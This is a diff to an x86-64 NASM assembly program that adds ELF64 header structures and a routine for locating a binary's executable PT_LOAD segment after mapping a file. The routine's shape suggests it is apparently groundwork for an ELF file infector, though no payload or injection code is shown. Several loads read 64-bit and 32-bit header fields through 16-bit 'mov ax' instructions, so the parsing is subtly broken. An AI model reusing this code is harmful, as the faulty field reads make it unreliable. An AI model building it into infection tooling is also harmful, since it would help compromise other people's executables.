@@ -49,6 +49,37 @@ struc	stat
 	.__unused	resq	3	; Unused
 endstruc
 
+struc	elf64_hdr
+	.e_ident:	resb	16
+	.e_type:	resw	1
+	.e_machine:	resw	1
+	.e_version:	resd	1
+	.e_entry:	resq	1
+	.e_phoff:	resq	1
+	.e_shoff:	resq	1
+	.e_flags:	resd	1
+	.e_ehsize:	resw	1
+	.e_phentsize:	resw	1
+	.e_phnum:	resw	1
+	.e_shentsize:	resw	1
+	.e_shnum:	resw	1
+	.e_shstrndx:	resw	1
+endstruc
+
+struc	elf64_phdr
+	.p_type:	resd	1
+	.p_flags:	resd	1
+	.p_offset:	resq	1
+	.p_vaddr:	resq	1
+	.p_paddr:	resq	1
+	.p_filesz:	resq	1
+	.p_memsz:	resq	1
+	.p_align:	resq	1
+endstruc
+
+%define PT_LOAD 1
+%define PF_X 0x1
+
 section .text
 
 _start:
@@ -175,6 +206,7 @@ treat_file:
 	%local fd:qword					; long fd;
 	%local filesize:qword				; long filesize;
 	%local mappedfile:qword				; void *mappedfile;
+	%local exec_segment:qword			; struct elf64_phdr *exec_segment;
 	%xdefine pathbuf rbp - %$localsize - PATH_MAX	; uint8_t pathbuf[PATH_MAX];
 	%assign %$localsize %$localsize + PATH_MAX	; ...
 	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
@@ -248,6 +280,12 @@ treat_file:
 	cmp rax, 1					; if (is_elf_64(mappedfile) != 1)
 	jne .unmap_err					; 	goto .unmap_err
 
+	; Find executable segment
+	mov rdi, [mappedfile]				; res = find_exec_segment(mappedfile);
+	call find_exec_segment				; ...
+	cmp rax, 0					; if (res == NULL)
+	je .unmap_err					; 	goto .unmap_err
+	mov [exec_segment], rax				; exec_segment = res;
 
 	jmp .unmap_file
 
@@ -317,6 +355,79 @@ is_elf_64:
 	.end_equal:
 		mov rax, 1				; return 1;
 		ret
+
+;elf64_phdr *find_exec_segment(char const *_file_map)
+;rax find_exec_segment(rdi file_map);
+find_exec_segment:
+	%push context
+	%stacksize flat64
+	%assign %$localsize 0
+
+	%local file_map:qword				; char const *file_map;
+	%local res_header:qword				; elf64_phdr *res_header;
+	%local e_phoff:qword				; long e_phoff;
+	%local e_phentsize:qword			; long e_phentsize;
+	%local e_phnum:qword				; long e_phnum;
+
+	; Initializes stack frame
+	push rbp
+	mov rbp, rsp
+	sub rsp, %$localsize
+
+	mov [file_map], rdi				; file_map = _file_map;
+	mov ax, [rdi + elf64_hdr.e_phoff]		; e_phoff = elf64_hdr.e_phoff;
+	mov [e_phoff], rax				; ...
+	mov ax, [rdi + elf64_hdr.e_phentsize]		; e_phentsize = elf64_hdr.e_phentsize;
+	mov [e_phentsize], rax				; ...
+	mov ax, [rdi + elf64_hdr.e_phnum]		; e_phnum = elf64_hdr.e_phnum;
+	mov [e_phnum], rax				; ...
+
+	; loop through program headers
+	mov rsi, 0					; i = 0;
+	.begin_phdr_loop:				; while (true) {
+		mov rax, [file_map]			; cur_phdr = file_map
+		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
+		mov rcx, [e_phentsize]			; 	+ i * elf64_hdr.e_phentsize
+		imul rcx, rsi				; 		...
+		add rax, rcx				; 		...
+		mov [res_header], rax			; res_header = cur_phdr;
+
+		; check if PT_LOAD
+		mov rdi, [res_header]			; if (cur_phdr->p_type != PT_LOAD)
+		add rdi, elf64_phdr.p_type		; ...
+		mov ax, [rdi]				; ...
+		cmp ax, PT_LOAD				; ...
+		jne .next_phdr_loop			; 	goto next_phdr_loop;
+
+		; check if executable
+		mov rdi, [res_header]			; if (!(cur_phdr->p_flags & PF_X))
+		add rdi, elf64_phdr.p_flags		; ...
+		mov ax, [rdi]				; ...
+		and ax, PF_X				; ...
+		cmp ax, PF_X				; ...
+		jne .next_phdr_loop			; 	goto next_phdr_loop;
+
+		jmp .found				; goto found;
+
+	.next_phdr_loop:
+		add rsi, 1				; i++;
+		cmp rsi, [e_phnum]			; if (i == e_phnum)
+		je .not_found				; 	goto not_found;
+		jmp .begin_phdr_loop			; }
+
+	.not_found:
+		xor rax, rax				; res = 0;
+		jmp .end				; goto end
+
+	.found:
+		mov rax, [res_header]			; res = res_header;
+		jmp .end				; goto end
+
+.end:
+	add rsp, %$localsize
+	pop rbp
+	%pop
+	ret
 
 ; DEBUG
 ; void print_string(char const *str);
